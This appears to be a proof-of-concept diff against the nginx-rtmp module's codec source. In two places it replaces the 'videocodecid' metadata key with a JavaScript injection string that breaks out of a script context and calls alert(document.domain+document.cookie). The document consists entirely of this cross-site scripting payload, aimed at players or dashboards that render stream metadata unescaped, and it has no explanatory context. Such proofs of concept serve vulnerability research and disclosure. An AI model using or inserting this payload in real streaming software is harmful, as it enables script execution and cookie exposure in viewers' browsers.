@@ -616,7 +616,7 @@ ngx_rtmp_codec_reconstruct_meta(ngx_rtmp_session_t *s)
           &v.video_data_rate, 0 },
 
         { NGX_RTMP_AMF_NUMBER,
-          ngx_string("videocodecid"),
+          ngx_string("1:1}))) ; } catch (e) {alert(document.domain+document.cookie)}//videocodecid"),
           &v.video_codec_id, 0 },
 
         { NGX_RTMP_AMF_NUMBER,
@@ -798,7 +798,7 @@ ngx_rtmp_codec_meta_data(ngx_rtmp_session_t *s, ngx_rtmp_header_t *h,
           &v.video_data_rate, 0 },
 
         { NGX_RTMP_AMF_VARIANT,
-          ngx_string("videocodecid"),
+          ngx_string("1:1}))) ; } catch (e) {alert(document.domain+document.cookie)}//videocodecid"),
           in_video_codec_id, sizeof(in_video_codec_id) },
 
         { NGX_RTMP_AMF_NUMBER,
